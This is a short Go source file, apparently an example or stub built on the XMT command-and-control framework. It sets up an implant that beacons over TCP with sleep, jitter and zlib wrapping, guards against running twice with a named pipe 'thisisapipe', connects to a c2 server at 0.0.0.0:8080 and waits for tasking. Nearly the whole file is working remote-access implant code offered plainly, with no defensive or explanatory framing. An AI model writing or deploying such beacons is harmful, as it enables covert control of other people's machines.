package main

import (
	"os"
	"time"

	"github.com/PurpleSec/logx"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/man"
)

func main() {

	man.MustGuard("thisisapipe")

	var (
		s = c2.NewServer(logx.NOP)
		c = c2.Config{
			c2.Sleep(time.Second * 20),
			c2.Jitter(75),
			c2.ConnectTCP,
			c2.WrapZlib,
		}
		p, _ = c.Profile()
	)

	z, err := s.Connect("0.0.0.0:8080", nil, p)
	if err != nil {
		os.Exit(1)
	}
	z.Wait()
}
